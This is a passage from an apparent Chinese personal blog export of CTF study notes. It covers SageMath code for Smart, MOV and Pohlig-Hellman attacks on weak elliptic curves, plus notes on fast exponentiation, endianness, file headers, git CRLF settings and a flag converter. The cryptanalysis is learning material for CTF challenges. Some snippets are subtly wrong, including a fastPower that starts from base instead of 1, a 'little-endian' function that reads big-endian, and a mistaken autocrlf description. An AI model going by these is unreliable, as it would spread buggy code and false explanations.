fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(n) // <span class="built_in">int</span>(fac)</span><br><span class="line">    <span class="comment"># dlog = (t*P).discrete_log(t*Q)</span></span><br><span class="line">    dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">    dlogs.append(dlog)</span><br><span class="line"><span class="comment"># 最终结果 k = P.discrete_log(Q)</span></span><br><span class="line">k = <span class="built_in">int</span>(crt(dlogs,primes))</span><br><span class="line"><span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure>
<h2 id="smart-攻击">Smart 攻击</h2>
<h3 id="特征">特征</h3>
<p>椭圆曲线的阶和素数 <span class="math inline">\(p\)</span>
恰好相等（<code>E.order() == p</code>）</p>
<h3 id="代码-1">代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b</span></span><br><span class="line">A = <span class="number">0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07</span></span><br><span class="line">B = <span class="number">0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2</span></span><br><span class="line">E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">P = E(<span class="number">10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861</span>, <span class="number">8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610</span>)</span><br><span class="line">Q = E(<span class="number">964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927</span>, <span class="number">5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用Smart攻击求解P.discrete_log(Q)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    `Returns`:</span></span><br><span class="line"><span class="string">        P.discrete_log(Q)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    E = P.curve()</span><br><span class="line">    p = E.base_ring().order()</span><br><span class="line">    <span class="keyword">if</span> E.order() != p:</span><br><span class="line">        <span class="keyword">raise</span> <span class="string">&quot;Smart&#x27;s attack need E.order() == p&quot;</span></span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> (P_Qp.xy()[<span class="number">1</span>]) % p == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> (Q_Qp.xy()[<span class="number">1</span>]) % p == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p * P_Qp</span><br><span class="line">    p_times_Q = p * Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P, y_P = p_times_P.xy()</span><br><span class="line">    x_Q, y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = (x_P // y_P)</span><br><span class="line">    phi_Q = (x_Q // y_Q)</span><br><span class="line">    k = phi_Q // phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line">k = <span class="built_in">int</span>(SmartAttack(P, Q))</span><br><span class="line"><span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure>
<h2 id="mov-攻击">MOV 攻击</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Curve parameters</span></span><br><span class="line">p = <span class="number">17</span></span><br><span class="line">a, b = <span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Target secret key</span></span><br><span class="line">d = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup curve</span></span><br><span class="line">Fp = GF(p)</span><br><span class="line">E = EllipticCurve(Fp, [a, b])</span><br><span class="line">G = E.gen(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">P = d * G</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the embedding degree</span></span><br><span class="line"><span class="comment"># p**k - 1 === 0 (mod order)</span></span><br><span class="line">order = E.order()</span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (p**k - <span class="number">1</span>) % order:</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">K.&lt;a&gt; = Fp.extension(k)</span><br><span class="line">EK = E.base_extend(K)</span><br><span class="line">PK = EK(P)</span><br><span class="line">GK = EK(G)</span><br><span class="line">QK = EK.lift_x(a + <span class="number">2</span>)  <span class="comment"># Independent from PK</span></span><br><span class="line">AA = PK.tate_pairing(QK, E.order(), k)</span><br><span class="line">GG = GK.tate_pairing(QK, E.order(), k)</span><br><span class="line">dlA = AA.log(GG)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dlA)</span><br></pre></td></tr></table></figure>
<h2 id="已知点反推系数">已知点反推系数</h2>
<p>已知两点 <span class="math inline">\(C_1(x_1,y_1),C_2(x_2,y_2)\)</span>，那么有 <span class="math display">\[
y_1^2=x_1^3+ax_1+b\pmod{p}\\
y_2^2=x_2^3+ax_2+b\pmod{p}
\]</span> 两边相减可得 <span class="math display">\[
y_1^2-y_2^2=(x_1^3-x_2^3)+a(x_1-x_2)\pmod{p}
\]</span> 即 <span class="math display">\[
a=[(y_1^2-y_2^2)-(x_1^3-x_2^3)](x_1-x_2)^{-1}\pmod{p}
\]</span> 那么 <span class="math display">\[
b=y_1^2-x_1^3-ax_1
\]</span> 已知三点 <span class="math inline">\(C_1(x_1,y_1),C_2(x_2,y_2),C_3(x_3,y_3)\)</span>，可得
<span class="math display">\[
(y_1^2-y_2^2)-(x_1^3-x_2^3)=a(x_1-x_2)\pmod{p}\\
(y_1^2-y_3^2)-(x_1^3-x_3^3)=a(x_1-x_3)\pmod{p}
\]</span> 有 <span class="math display">\[
[(y_1^2-y_2^2)-(x_1^3-x_2^3)](x_1-x_3)=a(x_1-x_2)(x_1-x_3)\pmod{p}\\
[(y_1^2-y_3^2)-(x_1^3-x_3^3)](x_1-x_2)=a(x_1-x_3)(x_1-x_2)\pmod{p}
\]</span> 两式相减可得 <span class="math display">\[
[(y_1^2-y_2^2)-(x_1^3-x_2^3)]-[(y_1^2-y_3^2)-(x_1^3-x_3^3)]=0\pmod{p}
\]</span> 即 <span class="math inline">\(p\)</span> 的公倍数。</p>
<h2 id="查看-ecc-的-pem-密钥文件信息">查看 ECC 的 pem 密钥文件信息</h2>
<p>使用 openssl</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看ECC私钥信息</span></span><br><span class="line">openssl ec -<span class="keyword">in</span> p384-key.pem -text -noout</span><br><span class="line"><span class="comment">#查看ECC公钥信息</span></span><br><span class="line">openssl ec -pubin -<span class="keyword">in</span> public.pem -text -noout</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>crypto</tag>
        <tag>ecc</tag>
        <tag>sagemath</tag>
      </tags>
  </entry>
  <entry>
    <title>快速幂笔记</title>
    <url>//fast-power-note.html</url>
    <content><![CDATA[<h1 id="快速幂">快速幂</h1>
<h2 id="描述">描述</h2>
<p>快速幂算法的核心思想是每一步都把指数分成两半，相应的底数做平方运算，这样就能将指数不断变小，同时循环次数降低，结果相同。</p>
<p>例如 <span class="math inline">\(a^{11}=a^{2^0+2^1+2^2}\)</span></p>
<p>很自然可以得到递归方程： <span class="math display">\[
a^n=\begin{cases}
a^{n-1}\cdot a,\mathrm{if\ n\ is\ odd}\\
a^{\frac n2}\cdot a^{\frac n2},\mathrm{if\ n\ is\ even\ but\ not\ 0}\\
1,\mathrm{if\ n=0}
\end{cases}
\]</span></p>
<h2 id="c-实现">C++ 实现</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 base^exp</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Type&gt;</span></span><br><span class="line"><span class="function">Type <span class="title">fastPower</span><span class="params">(Type base, <span class="type">unsigned</span> <span class="type">int</span> exp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Type <span class="title">result</span><span class="params">(base)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (exp)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (exp &amp; <span class="number">1</span>)result = result * base;</span><br><span class="line">		base *= base;</span><br><span class="line">		exp &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算 base^exp%mod</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Type&gt;</span></span><br><span class="line"><span class="function">Type <span class="title">fastPower</span><span class="params">(Type base, <span class="type">unsigned</span> <span class="type">int</span> exp, <span class="type">unsigned</span> <span class="type">int</span> mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Type <span class="title">result</span><span class="params">(base)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (exp)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (exp &amp; <span class="number">1</span>)result = result * base % mod;</span><br><span class="line">		base = base * base % mod;</span><br><span class="line">		exp &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="矩阵快速幂">矩阵快速幂</h2>
<p>特别地，实际上对于矩阵来说，也可以按照同样的道理进行快速幂计算。</p>
<p>因为矩阵也满足线性运算，自然可以进行快速幂。例如 <span class="math display">\[
\left(\left[
\begin{matrix}
1&amp;2\\
3&amp;4
\end{matrix}
\right]\right)^{11}
=
\displaystyle\left(\left[
\begin{matrix}
1&amp;2\\
3&amp;4
\end{matrix}
\right]\right)^{2^0+2^1+2^2}
\]</span></p>
<h1 id="应用">应用</h1>
<h2 id="矩阵加速递推">矩阵加速递推</h2>
<p>矩阵快速幂可以应用在加速递推上。</p>
<p>例如对于斐波那契数列 <span class="math inline">\(f(n)=f(n-1)+f(n-2)\)</span>，当 <span class="math inline">\(n\)</span>
较小时，我们可以通过递归或者循环得到数列值；但当 <span class="math inline">\(n\)</span> 较大时，使用递归或者循环效率就低了；当
<span class="math inline">\(n\)</span>
特别大时，不难发现如果用普通的算法几乎已经是无解了。</p>
<p>但是，我们可以用另一种方法解决递推数列问题。</p>
<p>我们构建一个 <span class="math inline">\(1\times2\)</span> 的答案矩阵
<span class="math inline">\(F(n)\)</span>： <span class="math display">\[
F(n)=\left[\begin{matrix}f(n)&amp;f(n-1)\end{matrix}\right]
\]</span> 然后构造一个 <span class="math inline">\(2\times2\)</span>
的累乘矩阵 <span class="math inline">\(base\)</span>： <span class="math display">\[
base=\left[\begin{matrix}a&amp;b\\c&amp;d\end{matrix}\right]
\]</span> 其中 <span class="math inline">\(a,b,c,d\)</span>
均为未知数，需要我们构造后能够满足条件： <span class="math display">\[
F(n)\times
base=F(n+1)=\left[\begin{matrix}f(n+1)&amp;f(n)\end{matrix}\right]
\]</span> 即 <span class="math display">\[
\left[\begin{matrix}f(n)&amp;f(n-1)\end{matrix}\right]\times
\left[\begin{matrix}a&amp;b\\c&amp;d\end{matrix}\right]=\left[\begin{matrix}af(n)+cf(n-1)&amp;bf(n)+df(n-1)\end{matrix}\right]=\left[\begin{matrix}f(n+1)&amp;f(n)\end{matrix}\right]
\]</span> 可以推得累乘矩阵 <span class="math inline">\(base\)</span> 为
<span class="math display">\[
base=\left[\begin{matrix}1&amp;1\\1&amp;0\end{matrix}\right]
\]</span> 那么我们就能够将斐波那契数列递推公式转换为含有矩阵的公式：
<span class="math display">\[
F(n+k)=F(n)\times base^k
\]</span> 比如说我们取 <span class="math inline">\(n=2\)</span>，即
<span class="math inline">\(F(n)=\left[\begin{matrix}f(2)&amp;f(1)\end{matrix}\right]=\left[\begin{matrix}1&amp;1\end{matrix}\right]\)</span></p>
<p>那么我们要求 <span class="math inline">\(F(20)\)</span>，即为 <span class="math display">\[
F(20)=F(2)*base^{18}
\]</span> 通过矩阵快速幂我们可以快速得到 <span class="math inline">\(base^{18}\)</span> 的结果，最后再与 <span class="math inline">\(F(2)\)</span>
矩阵相乘即可得到最终结果，将算法效率提高至 <span class="math inline">\(O(log\ n)\)</span></p>
<h3 id="带常数项-k">带常数项 <span class="math inline">\(k\)</span></h3>
<p>例如递推方程 <span class="math inline">\(f(n)=f(n-1)+f(n-2)+k\)</span>，求 <span class="math inline">\(f(n)\)</span></p>
<p>构建常数项递推式：<span class="math inline">\(k_n=k_{n-1}+0\)</span></p>
<p>常数项不可忽略，需要专门加一维来计算常数。</p>
<p>故构建矩阵如下： <span class="math display">\[
F(n)=\left[\begin{matrix}f(n)&amp;f(n-1)&amp;k\end{matrix}\right],\
base=\left[\begin{matrix}1&amp;1&amp;0\\1&amp;0&amp;0\\1&amp;0&amp;1\end{matrix}\right]
\]</span></p>
<h3 id="带未知数项-n">带未知数项 <span class="math inline">\(n\)</span></h3>
<p>例如递推方程 <span class="math inline">\(f(n)=f(n-1)+f(n-2)+n\)</span>，求 <span class="math inline">\(f(n)\)</span></p>
<p>构建常数项递推式：<span class="math inline">\(n=(n-1)+1\)</span></p>
<p>虽然 <span class="math inline">\(f(n)\)</span>
的转移只有四项，但需要加多一维来辅助未知项 <span class="math inline">\(n\)</span> 的递推。</p>
<p>故构建矩阵如下： <span class="math display">\[
F(n)=\left[\begin{matrix}f(n)&amp;f(n-1)&amp;n&amp;1\end{matrix}\right],\
base=\left[\begin{matrix}1&amp;1&amp;0&amp;0\\1&amp;0&amp;0&amp;0\\1&amp;0&amp;1&amp;0\\1&amp;0&amp;1&amp;1\end{matrix}\right]
\]</span></p>
<h3 id="求和">求和</h3>
<p>例如递推方程 <span class="math inline">\(f(n)=f(n-1)+f(n-2)\)</span>，求 <span class="math inline">\(S(n)=\displaystyle\sum_{i=1}^nf(i)\)</span></p>
<p>需要尝试将 <span class="math inline">\(S(n)\)</span> 放入矩阵与 <span class="math inline">\(f(n)\)</span> 一起递推。</p>
<p><strong>前缀和的递推式</strong>为：<span class="math inline">\(S(n)=S(n-1)+f(n)\)</span></p>
<p>故构建矩阵如下： <span class="math display">\[
F(n)=\left[\begin{matrix}f(n)&amp;f(n-1)&amp;S(n-1)\end{matrix}\right],\
base=\left[\begin{matrix}1&amp;1&amp;1\\1&amp;0&amp;0\\0&amp;0&amp;1\end{matrix}\right]
\]</span></p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>字节序笔记</title>
    <url>//endian-note.html</url>
    <content><![CDATA[<h1 id="字节序简述">字节序简述</h1>
<p>字节序，即<strong>字节的存储顺序</strong>，而计算机硬件有两种存储数据的方式：大端字节序
(big-endian) 和 小端字节序 (little endian)。</p>
<p>一般来说，计算机硬件的存储方式都是<strong>小端字节序</strong>；</p>
<p>而网络数据包为了可读性更高，会选择<strong>大端字节序</strong>。</p>
<p>从地址低端向地址高端，小端字节序是将多字节数据按<strong>从低位到高位</strong>的顺序存储；而大端字节序是将多字节数据按<strong>从高位到低位</strong>的顺序存储。</p>
<p>例如 <code>0x01234567</code> 的两种字节序存储方式如下图：</p>
<figure>
<img src="/endian-note/字节序.png" alt="0x01234567的字节序">
<figcaption aria-hidden="true">0x01234567的字节序</figcaption>
</figure>
<p>一般来说，只有在数据交换和读取数据的时候才需要注意字节序，例如
PowerPC 的数据转换成 Windows
下的数据的时候需要注意字节序问题；或是数据包数据的转换 (比如说C语言里的
<code>htons</code> 函数可以将主机字节顺序转变成网络字节顺序)。</p>
<h1 id="c-实现">C++ 实现</h1>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">WORD <span class="title">littleEndianToWord</span><span class="params">(<span class="type">const</span> BYTE* a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (a[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | (a[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">littleEndianToDword</span><span class="params">(<span class="type">const</span> BYTE* a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (a[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (a[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (a[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | (a[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于大端字节序转储，在C++中直接使用强制类型转换即可。</p>
</blockquote>
<h1 id="python-实现">python 实现</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">littleEndianToDword</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">str</span>(a[<span class="number">0</span>])+<span class="built_in">str</span>(a[<span class="number">1</span>])+<span class="built_in">str</span>(a[<span class="number">2</span>])+<span class="built_in">str</span>(a[<span class="number">3</span>]), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bigEndianToDword</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">str</span>(a[-<span class="number">1</span>])+<span class="built_in">str</span>(a[-<span class="number">2</span>])+<span class="built_in">str</span>(a[-<span class="number">3</span>])+<span class="built_in">str</span>(a[-<span class="number">4</span>]), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p>同时 python 也存在函数可以将大端字节序的 <code>bytes</code>
数组转储为 <code>int</code> 型数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;&#x27;</span>, <span class="string">&#x27;big&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>文件头笔记</title>
    <url>//file-header-note.html</url>
    <content><![CDATA[<table>
<colgroup>
<col style="width: 30%">
<col style="width: 49%">
<col style="width: 20%">
</colgroup>
<thead>
<tr class="header">
<th>文件类型</th>
<th>文件头</th>
<th>特征值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>JPEG (jpg)</td>
<td>FFD8FF</td>
<td><code>ÿØÿà</code></td>
</tr>
<tr class="even">
<td>PNG (png)</td>
<td>89504E47</td>
<td><code>PNG</code></td>
</tr>
<tr class="odd">
<td>GIF (gif)</td>
<td>47494638</td>
<td><code>GIF89a</code> (<code>GIF87a</code>)</td>
</tr>
<tr class="even">
<td>ZIP Archive (zip)</td>
<td>504B0304</td>
<td><code>PK</code></td>
</tr>
<tr class="odd">
<td>TIFF (tif)</td>
<td>49492A00</td>
<td><code>II*</code></td>
</tr>
<tr class="even">
<td>Windows Bitmap (bmp)</td>
<td>424D</td>
<td><code>BM</code></td>
</tr>
<tr class="odd">
<td>RAR Archive (rar)</td>
<td>52617221</td>
<td><code>Rar!</code></td>
</tr>
<tr class="even">
<td>Wave (wav)</td>
<td>57415645</td>
<td><code>WAVE</code></td>
</tr>
<tr class="odd">
<td>AVI (avi)</td>
<td>41564920</td>
<td><code>AVI</code></td>
</tr>
<tr class="even">
<td>MPEG (mpg) 音频数据和视频数据</td>
<td>000001BA</td>
<td></td>
</tr>
<tr class="odd">
<td>MPEG (mpg) 视频数据</td>
<td>000001B3</td>
<td></td>
</tr>
<tr class="even">
<td>7Z</td>
<td>377ABCAF271C</td>
<td><code>7z¼¯'</code></td>
</tr>
<tr class="odd">
<td>CAD (dwg)</td>
<td>41433130</td>
<td><code>AC10</code></td>
</tr>
<tr class="even">
<td>Adobe Photoshop (psd)</td>
<td>38425053</td>
<td><code>8BPS</code></td>
</tr>
<tr class="odd">
<td>Rich Text Format (rtf)</td>
<td>7B5C727466</td>
<td><code>&#123;\rtf</code></td>
</tr>
<tr class="even">
<td>XML (xml)</td>
<td>3C3F786D6C</td>
<td><code>&lt;?xml</code></td>
</tr>
<tr class="odd">
<td>Email [thorough only] (eml)</td>
<td>44656C69766572792D646174653A</td>
<td><code>Delivery-date:</code></td>
</tr>
<tr class="even">
<td>Outlook Express (dbx)</td>
<td>CFAD12FEC5FD746F</td>
<td></td>
</tr>
<tr class="odd">
<td>Outlook (pst)</td>
<td>2142444E</td>
<td><code>!BDN</code></td>
</tr>
<tr class="even">
<td>MS Word/Excel (xls / doc)</td>
<td>D0CF11E0</td>
<td></td>
</tr>
<tr class="odd">
<td>MS Access (mdb)</td>
<td>5374616E64617264204A</td>
<td><code>Standard J</code></td>
</tr>
<tr class="even">
<td>WordPerfect(wpd)</td>
<td>FF575043</td>
<td><code>ÿWPC</code></td>
</tr>
<tr class="odd">
<td>Adobe Acrobat (pdf)</td>
<td>255044462D312E</td>
<td><code>%PDF</code></td>
</tr>
<tr class="even">
<td>Quicken (qdf)</td>
<td>AC9EBD8F</td>
<td></td>
</tr>
<tr class="odd">
<td>Windows Password (pwl)</td>
<td>E3828596</td>
<td></td>
</tr>
<tr class="even">
<td>Real Audio (ram)</td>
<td>2E7261FD</td>
<td><code>.raý</code></td>
</tr>
<tr class="odd">
<td>Real Media (rm)</td>
<td>2E524D46</td>
<td><code>.RMF</code></td>
</tr>
<tr class="even">
<td>Quicktime (mov)</td>
<td>6D6F6F76</td>
<td><code>moov</code></td>
</tr>
<tr class="odd">
<td>Windows Media (asf)</td>
<td>3026B2758E66CF11</td>
<td></td>
</tr>
<tr class="even">
<td>MIDI (mid)</td>
<td>4D546864</td>
<td><code>MThd</code></td>
</tr>
<tr class="odd">
<td>Win PE</td>
<td>4D5A</td>
<td><code>MZ</code></td>
</tr>
<tr class="even">
<td>ELF</td>
<td>7F 45 4C 46</td>
<td><code>.ELF</code></td>
</tr>
<tr class="odd">
<td>VMDK</td>
<td>4B 44 4D</td>
<td><code>KDM</code></td>
</tr>
<tr class="even">
<td>Java-class</td>
<td>CA FE BA BE</td>
<td><code>Êþº¾</code></td>
</tr>
<tr class="odd">
<td>Postscript (eps / ps)</td>
<td>252150532D41646F6265</td>
<td><code>%!PS-Adobe</code></td>
</tr>
<tr class="even">
<td>m4a</td>
<td>00 00 00 18 66 74 79 70 6D 70 34 32</td>
<td><code>....ftypmp42</code></td>
</tr>
<tr class="odd">
<td>m4a; m4v</td>
<td>00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00</td>
<td></td>
</tr>
</tbody>
</table>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>file</tag>
      </tags>
  </entry>
  <entry>
    <title>Git与CRLF笔记</title>
    <url>//git-crlf-note.html</url>
    <content><![CDATA[<h1 id="crlf-与-lf-简述">CRLF 与 LF 简述</h1>
<ul>
<li>CR → Carriage Return，对应ASCII中转义字符
<code>\r</code>，十六进制为 <code>0D</code>，表示回车</li>
<li>LF → Linefeed，对应ASCII中转义字符 <code>\n</code>，十六进制为
<code>0A</code> 表示换行</li>
<li>CRLF → Carriage Return &amp; Linefeed，<code>\r\n</code>，十六进制为
<code>0D0A</code>，表示回车并换行</li>
</ul>
<p>实际上，这与不同的操作系统有关，Windows 平台下使用 CRLF
表示换行；Unix/Linux/Mac OS X 平台下使用单字符 LF 表示换行；而 MacIntosh
(即早期 Mac 操作系统) 采用 CR 表示换行。</p>
<blockquote>
<p>需要注意到的是，在 Windows 平台下，如果在命令行环境下打印
<code>\r</code> 字符，会将光标前移到第一位。</p>
</blockquote>
<h1 id="git-与-crlf">Git 与 CRLF</h1>
<p>我们知道 Git
是版本管理工具，而跨平台开发也是经常性的事情。这个时候注意到，如果 Linux
下的代码文件，被 Git 拉取到 Windows 平台下时，很可能出现 Windows
平台下出现读取错误、编译错误等问题。</p>
<p>所以 Git 提供了一个名为 <code>core.autocrlf</code>
的配置，可以将换行结尾自动化转换。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global core.autocrlf  [<span class="literal">true</span> | input | <span class="literal">false</span>]</span><br><span class="line">git config --<span class="built_in">local</span> core.autocrlf  [<span class="literal">true</span> | input | <span class="literal">false</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>true</code> → 提交新版本时，将所有换行结尾转换为
CRLF；回退版本时，将所有换行结尾转换为 CRLF。</li>
<li><code>input</code> → 提交新版本时，将所有换行结尾转换为
CRLF；回退版本时，不转换。</li>
<li><code>false</code> → 提交新版本和回退版本时，都不转换。</li>
</ul>
<p>但此项设置只针对 CRLF 和 LF 单一存在的文本文件。</p>
<p>如果想要检查出 CRLF 和 LF 混合存在的文本文件，需要使用
<code>core.safecrlf</code> 配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global core.safecrlf [<span class="literal">true</span> | <span class="literal">false</span> | warn]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>true</code> → 禁止提交混合换行符的文本文件。</li>
<li><code>false</code> → 不禁止提交混合换行符的文本文件。</li>
<li><code>warn</code> → 提交混合换行符的文本文件时发出警告。</li>
</ul>
<p>一般来说在进行跨平台开发时，建议使用以下指令，防止发生换行符异常问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --<span class="built_in">local</span> core.autocrlf <span class="literal">true</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>linux</tag>
        <tag>git</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf-flag 笔记</title>
    <url>//flag-note.html</url>
    <content><![CDATA[<h1 id="flag-简述">flag 简述</h1>
<p>flag 英文单词愿意为旗帜，在 CTF
比赛中是我们的目标，通常以一串字符串的形式存在，满足正则表达式：<code>flag&#123;.*&#125;</code></p>
<p>其中不一定以 flag 开头，可能是以比赛名称开头，例如
<code>TQLCTF&#123;.*&#125;</code>；也有可能是以某个组织的名称开头，例如
<code>BUUCTF&#123;.*&#125;</code></p>
<p>而且 flag
又分为<strong>动态flag</strong>和<strong>静态flag</strong>，记得最好不要去提交他人的
flag 哦！</p>
<h1 id="flag-转义器">flag 转义器</h1>
<p>自己手写的简单的 flag 转义器，一是为了方便自己认读
flag，二是为了方便自己写的 flag 像 flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">table = (<span class="string">&#x27;Aa4@&#x27;</span>, <span class="string">&#x27;Bb8&#x27;</span>, <span class="string">&#x27;Cc&#x27;</span>, <span class="string">&#x27;Dd&#x27;</span>, <span class="string">&#x27;Ee3&#x27;</span>, <span class="string">&#x27;Ff&#x27;</span>, <span class="string">&#x27;Gg69&#x27;</span>, <span class="string">&#x27;Hh&#x27;</span>, <span class="string">&#x27;Ii&#x27;</span>, <span class="string">&#x27;Jj&#x27;</span>, <span class="string">&#x27;Kk&#x27;</span>, <span class="string">&#x27;Ll1&#x27;</span>, <span class="string">&#x27;Mm&#x27;</span>, <span class="string">&#x27;Nn&#x27;</span>, <span class="string">&#x27;Oo0&#x27;</span>, <span class="string">&#x27;Pp&#x27;</span>, <span class="string">&#x27;Qq&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;Rr&#x27;</span>, <span class="string">&#x27;Ss5$&#x27;</span>, <span class="string">&#x27;Tt7&#x27;</span>, <span class="string">&#x27;Uu&#x27;</span>, <span class="string">&#x27;Vv&#x27;</span>, <span class="string">&#x27;Ww&#x27;</span>, <span class="string">&#x27;Xx&#x27;</span>, <span class="string">&#x27;Yy&#x27;</span>, <span class="string">&#x27;Zz2&#x27;</span>)</span><br><span class="line">alpha = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findalpha</span>(<span class="params">ch</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> table[i]:</span><br><span class="line">            <span class="keyword">return</span> alpha[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag2plain</span>(<span class="params">flag : <span class="built_in">str</span></span>) -&gt; <span 